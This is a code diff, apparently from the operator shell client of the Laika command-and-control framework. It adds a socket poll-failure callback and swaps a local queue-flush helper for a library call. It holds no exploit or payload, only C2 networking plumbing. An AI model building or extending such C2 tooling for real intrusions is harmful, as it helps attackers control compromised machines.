@@ -135,6 +135,14 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     true),
 };
 
+/* socket event */
+void shellC_onPollFail(struct sLaika_socket *sock, void *uData) {
+    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
+    struct sShell_client *client = (struct sShell_client*)uData;
+
+    laikaS_kill(&client->peer->sock);
+}
+
 /* ===============================================[[ Client API ]]=============================================== */
 
 void shellC_init(tShell_client *client) {
@@ -142,8 +150,8 @@ void shellC_init(tShell_client *client) {
     client->peer = laikaS_newPeer(
         shellC_pktTbl,
         &client->pList,
-        NULL,
-        NULL,
+        shellC_onPollFail,
+        (void*)client,
         (void*)client
     );
 
@@ -222,22 +230,12 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     /* the handshake requests will be sent on the next call to shellC_poll */
 }
 
-void shellC_flushQueue(tShell_client *client) {
-    /* flush pList's outQueue */
-    if (client->pList.outCount > 0) {
-        if (!laikaS_handlePeerOut(&client->peer->sock))
-            laikaS_kill(&client->peer->sock);
-
-        laikaP_resetOutQueue(&client->pList);
-    }
-}
-
 bool shellC_poll(tShell_client *client, int timeout) {
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
     /* flush any events prior (eg. made by a command handler) */
-    shellC_flushQueue(client);
+    laikaP_flushOutQueue(&client->pList);
     evnt = laikaP_poll(&client->pList, timeout, &numEvents);
 
     if (numEvents == 0) /* no events? timeout was reached */
@@ -247,7 +245,7 @@ bool shellC_poll(tShell_client *client, int timeout) {
         laikaS_kill(&client->peer->sock);
 
     /* flush any events after (eg. made by a packet handler) */
-    shellC_flushQueue(client);
+    laikaP_flushOutQueue(&client->pList);
     return true;
 }
 
